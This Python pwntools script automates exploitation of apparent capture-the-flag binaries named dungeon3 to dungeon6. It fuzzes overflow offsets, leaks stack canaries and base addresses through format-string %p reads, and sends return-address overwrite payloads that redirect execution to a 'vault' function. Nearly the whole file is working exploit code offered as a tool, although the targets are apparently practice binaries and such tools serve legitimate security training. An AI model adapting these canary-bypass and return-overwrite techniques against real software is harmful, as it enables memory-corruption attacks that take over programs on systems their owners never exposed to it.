import subprocess
from pwn import *
from colorama import Fore, init
import signal
import sys
import time
import re
import os

init(autoreset=True)

def dung5_exploit(program_name, chosen_canary, buffer_overflow_lenght):

    exe = './{}'.format(program_name)
    elf = context.binary = ELF(exe, checksec=False)
    io = process(exe)
    
    offset = "A" * buffer_overflow_lenght
    can = chosen_canary

    payload = '%{}$p'.format(can).encode()
    print(f"{Fore.YELLOW}[+]{Fore.RESET} We are firstly going to send our base- and canary address pointer to leak the data: {payload}")
    io.sendlineafter(b'!', payload)
    io.recvline()
    leaked = io.recvline().strip().decode()
    canary = int(leaked, 16)
    
    print(f'{Fore.YELLOW}[+]{Fore.RESET} The leaked canary address: {canary}')
    
    payload = flat([
        offset.encode(), 
        p64(canary, endianness='little', sign='unsigned'),
        8 * b'A',      # Pad to Ret Pointer
        p64(elf.symbols.vault)
    ])

    print(f'{Fore.YELLOW}[+]{Fore.RESET} We have constructed our payload, and are sending: {payload}\n')

    io.clean()
    io.sendline(payload)

    banner = io.read(1024)
    print(banner)

    print(f"{Fore.GREEN}[+] Exploit was successful!")

def medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length):
    
    exe = './{}'.format(program_name)
    elf = context.binary = ELF(exe, checksec=False)
    io = process(exe)

    offset = "A" * buffer_overflow_length

    can = chosen_canary
    add = chosen_addr

    payload = '%{}$p.%{}$p'.format(can, add).encode()
    print(f"{Fore.YELLOW}[+]{Fore.RESET} We are firstly going to send our base- and canary address pointer to leak the data: {payload}")
    io.sendlineafter(b'!', payload)
    io.recvline()
    leaked = io.recvline().strip().decode()
    canary = int(leaked.split('.')[0], 16)  # Canary is at the 15th place
    leaked_address = int(leaked.split('.')[1], 16)  # Leaked address is at the 21st place

    print(f'{Fore.YELLOW}[+]{Fore.RESET} The leaked base address: {leaked_address}')
    print(f'{Fore.YELLOW}[+]{Fore.RESET} The leaked canary address: {canary}')

    vault_address = leaked_address - 0x100

    print(f'{Fore.YELLOW}[+]{Fore.RESET} We have substracted 0x100 bytes from our base address, our vault address: {vault_address}')

    payload = flat([
        offset.encode(), 
        p64(canary, endianness='little', sign='unsigned'),   # Leaked Canary
        8 * b'A',      # Pad to Ret Pointer
        p64(vault_address, endianness='little', sign='unsigned')  # New vault address
    ])
    
    print(f'{Fore.YELLOW}[+]{Fore.RESET} We have constructed our payload, and are sending: {payload}\n')

    io.clean()
    io.sendline(payload)

    banner = io.read(1024)
    print(banner)

    return banner

def signal_handler(sig, frame):
    print("\nCtrl+C detected. Exiting gracefully...")
    sys.exit(0)

def detect_canaries(program_name, detect_type='canary', option=None, choice=None):
    context.log_level = 'error'
    elf = context.binary = ELF(f'./{program_name}', checksec=False)

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        if detect_type == 'canary':
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Please select an option: \n")
            print(f"{Fore.BLUE}[1]{Fore.RESET} Find the canary")
            print(f"{Fore.BLUE}[2]{Fore.RESET} Go back to main menu")
        else:  # detect_type is 'address'
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Please select an option: \n")
            print(f"{Fore.BLUE}[1]{Fore.RESET} Find a leaked address")
            print(f"{Fore.BLUE}[2]{Fore.RESET} Go back to main menu")

        if option is None:  # If no option is provided as an argument, ask for user input
            option = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Your choice: ").strip()
        
        # Option 1: Find the canary
        if detect_type == 'canary':
            if option == '1':
                while True:
                    potential_canaries = []
                    for i in range(1, 101):
                        try:
                            p = process(elf.path)
                            p.sendline('%{}$p'.format(i).encode())
                            p.recvline()

                            result = p.recvline().decode().strip()

                            if result.endswith('00') and not result.startswith('f7') and not result.startswith('7f'):
                                potential_canaries.append((i, result))

                            p.close()
                        except EOFError:
                            pass
                    
                    print(f"\n{Fore.GREEN}The intelligence checks we use to find the potential canaries are: ")
                    print(f"{Fore.GREEN}   It ends with '00'")
                    print(f"{Fore.GREEN}   It does not start with 'f7'")
                    print(f"{Fore.GREEN}   It does not start with '7f'")
                    print(f"\n{Fore.YELLOW}[+]{Fore.RESET}These are the potential canary addresses\n")
                    for idx, (pos, canary) in enumerate(potential_canaries):
                        print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Canary = {Fore.GREEN}{canary}{Fore.RESET}")
                    time.sleep(1)
                    if choice is None:
                        choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a canary, right one is number 2 (Enter number, r to rerun, b to go back): ").strip()

                    if choice.lower() == 'r':
                        choice = None
                        continue
                    elif choice.lower() == 'b':
                        choice = None
                        break
                    else:
                        try:
                            # Check if the user's choice is a valid index in the list of potential canaries
                            choice = int(choice)
                            if 1 <= choice <= len(potential_canaries):
                                chosen_canary = potential_canaries[choice - 1]
                                print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_canary[0]}{Fore.RESET}, Canary = {Fore.GREEN}{chosen_canary[1]}{Fore.RESET}")
                                return chosen_canary  # Return the chosen canary as a tuple
                            else:
                                print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
                        except ValueError:
                            print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
 
            elif option == '2':
                print(f"\n{Fore.RED}[-]{Fore.RESET} You have not chosen a canary yet so, the result of the canary will be None")
                return None, None  # Return None for both values to indicate going back to the main menu
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Invalid option!")
            
        else:  # detect_type is 'address
            if option == '1':
                # Option 2: Find a leaked address
                while True:
                    potential_addresses = []

                    for i in range(1, 31):
                        try:
                            last_values = []

                            # We need to run this multiple times for a single i to check consistency
                            for _ in range(5):
                                # Create process
                                p = process(elf.path)
                                p.sendline('%{}$p'.format(i).encode())
                                p.recvline()

                                result = p.recvline().decode().strip()

                                if result and result != "(nil)" and len(result) >= 4:
                                    last_two = result[-2:]  # get the last 2 digits
                                    consecutive_zeros = result.count('00')

                                    if last_two != 'ff' and consecutive_zeros <= 9:
                                        last_values.append(last_two)

                                # If we've run it 5 times and the last 2 digits stayed the same, print it
                                if len(last_values) == 5 and len(set(last_values)) == 1:
                                    potential_addresses.append((i, result))

                                p.close()
                        except EOFError:
                            pass
                    print(f"\n{Fore.GREEN}The intelligence checks we use to find potential base addresses are: ")
                    print(f"{Fore.GREEN}   Verify if the last two characters of the result are not 'ff'")
                    print(f"{Fore.GREEN}   Check if the result contains '00' less than or equal to 9 times")
                    print(f"{Fore.GREEN}   Consider the potential address valid if after 5 runs, the last two characters remain the same")

                    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} These are the potential leaked addresses\n")
                    for idx, (pos, addr) in enumerate(potential_addresses):
                        print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Leaked address = {Fore.GREEN}{addr}{Fore.RESET}")
                    time.sleep(1)
                    if choice is None:
                        choice = input(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a leaked address, right one is number 7 (Enter number, r to rerun, b to go back): ").strip()

                    if choice.lower() == 'r':
                        choice = None
                        continue
                    elif choice.lower() == 'b':
                        choice = None
                        break
                    else:
                        try:
                            choice = int(choice)
                            if 1 <= choice <= len(potential_addresses):
                                chosen_addr = potential_addresses[int(choice)-1]
                                print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_addr[0]}{Fore.RESET}, Leaked address = {Fore.GREEN}{chosen_addr[1]}{Fore.RESET}")
                                return chosen_addr  # Return the chosen address position as a tuple
                            else:
                                print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
                        except ValueError:
                            print(f"\n{Fore.RED}[-]{Fore.RESET} Invalid option!\n")
            elif option == '2':
                print(f"\n{Fore.RED}[-]{Fore.RESET} You have not chosen a address yet so, the result of the address pointer will be None")
                return None, None  # Return None for both values to indicate going back to the main menu
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Invalid option!")

def detect_buffer_overflow(program_name):
    os.environ["LIBC_FATAL_STDERR_"] = "1"

    buffer_overflow_length = 0

    for i in range(1, 100):  # We'll start from 1 and go up to 100
        try:
            print(f"Fuzzing with {i} characters...")  # Print progress
            p = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

            p.stdin.write('prompt1\n')  # Respond to the first prompt

            p.stdin.flush()  
            payload = "A" * i + '\x00'
            p.stdin.write(payload + '\n')
            print(payload)
            p.stdin.flush()

            if "*** stack smashing detected ***: terminated" in p.stderr.read():
                print(f"{Fore.RED}[=] stack smashing detected at {i} characters.{Fore.RESET}")
                buffer_overflow_length = i
                break
        finally:
            p.kill()  # Ensure the process is killed

    if buffer_overflow_length == 0:
        print("No buffer overflow detected within the range.")
    else:
        print(f"The input buffer overflows after {buffer_overflow_length} characters.")

    return buffer_overflow_length

def analyze_binary(program_name):
    elf = ELF(program_name)

    features = {
        'NX': elf.nx, # No eXecute
        'PIE': elf.pie, # Position Independent Executable
        'Canary': elf.canary, # Stack Canary
        'RelRO': elf.relro # RElocation Read-Only
    }

    if not features['Canary']:
        print(Fore.GREEN + "[+] This binary does not have a stack canary. A simple buffer overflow attack might be successful." + Fore.RESET)
    else:
        print(Fore.RED + "[+] This binary has a stack canary. A simple buffer overflow attack would not be successful. You might need to bypass the stack canary." + Fore.RESET)

    if not features['NX']:
        print(Fore.GREEN + "[+] NX is not enabled. You can execute code on the stack." + Fore.RESET)
    else:
        print(Fore.RED + "[+] NX is enabled. You cannot execute code on the stack." + Fore.RESET)

    if not features['PIE']:
        print(Fore.GREEN + "[+] PIE is not enabled. The binary has a static memory layout." + Fore.RESET)
    else:
        print(Fore.RED + "[+] PIE is enabled. The binary has a dynamic memory layout." + Fore.RESET)

    if features['RelRO'] == 'Full':
        print(Fore.GREEN + "[+] Full RELRO is enabled. You cannot modify the GOT." + Fore.RESET)
    elif features['RelRO'] == 'Partial':
        print(Fore.GREEN + "[+] Partial RELRO is enabled. You can modify the GOT." + Fore.RESET)
    else:
        print(Fore.GREEN + "[+] RELRO is not enabled. You can modify the PLT and GOT.\n" + Fore.RESET)

    return features

def get_func_address(elf, func_name):
    try:
        return elf.symbols[func_name]
    except KeyError:
        print(Fore.RED + f"\n[-] Function {func_name} not found in the binary." + Fore.RESET)
        return None

def fuzz(program_name):
    context.bits = 64
    buffer_overflow_length = 0

    for i in range(1, 101):
        a_str = b"A" * i
        time.sleep(0.1)
        proc = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate(a_str)
        if proc.returncode != 0:
            if proc.returncode == -11:
                print(Fore.YELLOW + f"[+] Segmentation fault encountered at {i} characters. The program may be vulnerable to a buffer overflow.")
                print(Fore.RESET)
                buffer_overflow_length = i
                break
            else:
                print(f"\nProcess exited with non-zero return code: {proc.returncode}")
                print(f"Standard error output: {stderr.decode()}")
                print(f"This is the output: {stdout.decode()}")
                break
        else:
            print(Fore.YELLOW + f"[+] Trying with buffer : {a_str}" + Fore.RESET, end='\r')

    if buffer_overflow_length > 0:
        print(Fore.GREEN + "[+] Fuzzing finished the buffer overflow length: ", buffer_overflow_length)
        return buffer_overflow_length
    else:
        return 0

def simple_bfo_exploit(program_name, buffer_overflow_length, target_func):
    elf = ELF(program_name)
    target_func_addr = get_func_address(elf, target_func)

    if target_func_addr is not None:
        p = process(f"./{program_name}")

        payload = b"A" * buffer_overflow_length
        payload += p64(target_func_addr)

        print(f"{Fore.YELLOW}[+] Our payload is going the be: {payload}" + Fore.RESET)

        p.sendline(payload)
        time.sleep(0.5)
        try:
            banner = p.recv().decode('utf-8')
            print(Fore.BLUE + banner + Fore.RESET)
        except EOFError:
            print("No output from the process. The process may have exited.")

        if "JCR" in banner:
            print(f"{Fore.GREEN}[+] Exploit was successful!")
        else:
            print(f"{Fore.RED}[-] Exploit was not successful.")

def detect_format_string_vuln(program_name):
    proc = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate(b"%p%p%p%x%x%s")

    payloadcan = (b"%p%p%p%x%x%s")

    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} We are now going to send our payload: {payloadcan} to see if the format specifiers are seen in the output. \n")
    time.sleep(1)
    # Create a pattern for a hexadecimal number
    hex_pattern = re.compile(r"0x[0-9A-Fa-f]+")

    # Search for the pattern in the output
    if re.search(hex_pattern, stdout.decode()) or re.search(hex_pattern, stderr.decode()):
        print(f"{Fore.GREEN}[+] Potential format string vulnerability detected, as seen in the output below\n")
        time.sleep(1)
        print(Fore.BLUE + stdout.decode() + Fore.RESET)
        print (f"{Fore.YELLOW}[+] The detection of the format string vulnerability was successfull ")
        return True
    else:
        print(f"{Fore.RED}[+]{Fore.RESET} No format string vulnerability detected.")
        return False

def format_string_exploit(program_name):
    p = process(program_name)

    payload = (b'%p%p%p%x%x%s')

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's first line: \n")
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} We are now sending our payload: {payload} \n")
    p.sendline(payload)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's second line: \n")
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's third line: \n")
    third_line = p.recvline().decode()
    print(Fore.BLUE + third_line + Fore.RESET)

    time.sleep(0.5)
    fruit = third_line.split('?')[0].split('0fc0')[-1]
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Found the fruitname! :", fruit)

    time.sleep(0.5)
    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} We are now going to send our payload:")
    p.sendline(fruit.encode())

    time.sleep(0.5)
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    last_line = p.recvline().decode()
    print(last_line)

    if "JCR" in last_line:
        print(f"{Fore.GREEN}[+] Exploit was successful!")
    else:
        print(f"{Fore.RED}[-] Exploit was not successful.")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    program_list = ["./dungeon3", "./dungeon4", "./dungeon5", "./dungeon6"]

    print(f"{Fore.YELLOW}[+]{Fore.RESET} Checking if the binaries are in the current directory...\n")
    time.sleep(1)
    missing_binaries = []  

    for program in program_list:
        if not os.path.isfile(program):
            missing_binaries.append(program)

    if missing_binaries:
        print(f"{Fore.RED}[-] The following programs were not found in the current directory:")
        for program in missing_binaries:
            print(f"{Fore.RED}   {program}")
        print(f"{Fore.RED}[-] Please place the binary files for this automation in the same directory and then run the script again.")
        return
    else:
        print(f"{Fore.GREEN}[+]{Fore.RESET} All binaries found. Proceeding with the program.")
        time.sleep(1)
    print(f"{Fore.BLUE}\n-----------------------------------------")
    print(f"{Fore.BLUE}Welcome to my Exploitation Automation")
    print(f"{Fore.BLUE}-----------------------------------------\n")

    print(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a program to analyze or exploit:\n")
    for i, program_name in enumerate(program_list, start=1):
        print(f"{Fore.BLUE}[{Fore.RESET}{i}{Fore.BLUE}]{Fore.RESET} {program_name}")
    
    while True:
        choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ")
        try:
            choice = int(choice)
            program_name = program_list[choice - 1]
            break 
        except (ValueError, IndexError):
            print(f"\n{Fore.RED}[-] Invalid choice. Try again.")  

    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Analyzing the binary...\n")
    features = analyze_binary(program_name)

    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose which type of automation you want to use \n")
    print(f"{Fore.BLUE}[1]{Fore.RESET} Analyze {program_name}")
    print(f"{Fore.BLUE}[2]{Fore.RESET} Exploit [AUTORUN] {program_name} \n")
    option = input(f"{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ").strip()

    if option == '1':  # Analyze vulnerabilities
        if program_name == "./dungeon3":
            print(f"{Fore.BLUE}[+]{Fore.RESET} This is going to be a basic length fuzzing.. \n")
            time.sleep(1)
            buffer_overflow_length = fuzz(program_name)
            return
        elif program_name == "./dungeon4":
            print(f"{Fore.BLUE}[+]{Fore.RESET} This is going to be a basic format string vulnerability checker..\n")
            time.sleep(1)
            if not detect_format_string_vuln(program_name): 
                print(f"{Fore.RED}[+]{Fore.RESET} The program is not vulnerable to format string exploit. Stopping further execution.\n")
                return  # return from the function if the program is not vulnerable
        elif program_name == "./dungeon5":
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} This is going to be an basic length fuzzing with a basic canary fuzzer..")
            time.sleep(1)
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} You are now going to try to find the canary stack pointer..")
            result = detect_canaries(program_name, 'canary')
            if result is not None:
                if len(result) == 2:
                    chosen_canary = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return 
            else:
                print("No canary chosen, going back to the main menu")
                return  # or whatever is appropriate in this case
            time.sleep(1)
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} We are now going to try to find the offset for a buffer-overflow by fuzzing it..\n")
            time.sleep(3)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print(f"{Fore.YELLOW}-----------------------------------------{Fore.RESET}")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} A sum of the information ")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} canary pointer is at: {chosen_canary}")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} buffer overflow length, offset is at: {buffer_overflow_length}")
            print(f"{Fore.YELLOW}-----------------------------------------{Fore.RESET}")
        elif program_name == "./dungeon6":
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} This is going to be an basic length fuzzing with a canary and base-address fuzzer (the offset for the address is currently placed at minus 0x100)..")
            time.sleep(1)
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} You are first going to try to find the canary stack pointer..")
            time.sleep(1)
            result = detect_canaries(program_name, 'canary')
            if result is not None: 
                if len(result) == 2:
                    chosen_canary = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return 
            else:
                print("No canary chosen, going back to the main menu")
                return 
            
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Now you need to find the proper base address pointer")
            time.sleep(1)
            result = detect_canaries(program_name, 'address')
            if result is not None:
                if len(result) == 2:
                    chosen_addr = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return
            else:
                print("No address chosen, going back to the main menu")
                return  
            time.sleep(1)
            print("\n[+] We are now going to try to find the offset for a buffer-overflow\n")
            time.sleep(1)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print(f"{Fore.YELLOW}-----------------------------------------{Fore.RESET}")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} A sum of the information we got: ")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} canary pointer is at: {chosen_canary}")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} leaked addr pointer is at: {chosen_addr}")
            print(f"{Fore.YELLOW}[+]{Fore.RESET} buffer overflow length, offset is at: {buffer_overflow_length}")
            print(f"{Fore.YELLOW}-----------------------------------------{Fore.RESET}")

    elif option == '2':  # Exploit vulnerabilities
        if program_name == "./dungeon3":
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} We are first going to find the offset for the buffer-overflow\n")
            buffer_overflow_length = fuzz(program_name)
            if buffer_overflow_length > 0:

                target_func = 'vault'
                print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} Please enter the target function name for example 'vault' (or 'q' to quit): ")
                    
                print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} You entered: {target_func}")
                simple_bfo_exploit(program_name, buffer_overflow_length, target_func)
            else:
                print("No buffer overflow vulnerability found.")
        elif program_name == "./dungeon4":
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} We are first going to check its vulnerable for a format string vulnerability. \n")
            if not detect_format_string_vuln(program_name):  # check if detect_format_string_vuln returns False
                print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} The program is not vulnerable to format string exploit. Stopping further execution.\n")
                return  # return from the function if the program is not vulnerable
            time.sleep(1)
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} Now we know that the program can be vulnerable lets exploit it \n")
            time.sleep(1)
            format_string_exploit(program_name)
        elif program_name == "./dungeon5":
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} This exploit is going to automatically fuzz the buffer-overflow length and then its fuzzing the canary pointers and you need to choose the right one...")
            time.sleep(1)
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} You are now going to try to find the canary stack pointer..")
            result = detect_canaries(program_name, 'canary', '1', '2')
            if result is not None:
                if len(result) == 2:
                    chosen_canary = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return 
            else:
                print("No canary chosen, going back to the main menu")
                return 
            time.sleep(1)
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} We are now going to try to find the offset for the buffer-overflow\n")
            time.sleep(3)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print(f"{Fore.BLUE}-----------------------------------------{Fore.RESET}")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} A sum of the information we have for our exploit ")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} canary pointer is at: {chosen_canary}")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} buffer overflow length, offset is at: {buffer_overflow_length}")
            print(f"{Fore.BLUE}-----------------------------------------{Fore.RESET}")
            print("Lets start exploiting")
            time.sleep(1)
            dung5_exploit(program_name, chosen_canary, buffer_overflow_length)
            pass
        elif program_name == "./dungeon6":
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} This exploit is going to automatically fuzz the BFO-length with a canary and base-address fuzzer (the offset for the address is currently placed at minus 0x100)..")
            time.sleep(1)
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} You are first going to try to find the canary stack pointer..")
            time.sleep(1)
            result = detect_canaries(program_name, 'canary', '1', '2')
            if result is not None: 
                if len(result) == 2:
                    chosen_canary = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return 
            else:
                print("No canary chosen, going back to the main menu")
                return 
            
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} Now you need to find the proper base address pointer")
            time.sleep(1)
            result = detect_canaries(program_name, 'address', '1', '10')
            if result is not None:
                if len(result) == 2:
                    chosen_addr = result[0]
                else: 
                    print("Unexpected result from canary detection")
                    return
            else:
                print("No address chosen, going back to the main menu")
                return  
            time.sleep(1)
            print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} We are now going to try to find the offset for the buffer-overflow\n")
            time.sleep(1)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print(f"{Fore.BLUE}-----------------------------------------{Fore.RESET}")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} A sum of the information we have for our payload: ")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} canary pointer is at: {chosen_canary}")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} leaked addr pointer is at: {chosen_addr}")
            print(f"{Fore.BLUE}[AUTORUN]{Fore.RESET} buffer overflow length, offset is at: {buffer_overflow_length}")
            print(f"{Fore.BLUE}-----------------------------------------{Fore.RESET}")
            print("Lets start exploiting")
            time.sleep(1)
            exploit_succesful = False

            while not exploit_succesful:
                banner = medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length)

                if b"JCR" in banner: 
                    exploit_successful = True
                    print(f"{Fore.GREEN}[+] Exploit was successful!")
                    break
            pass
    else:
        print("Invalid choice. Exiting.")
        return

if __name__ == "__main__":
    main()
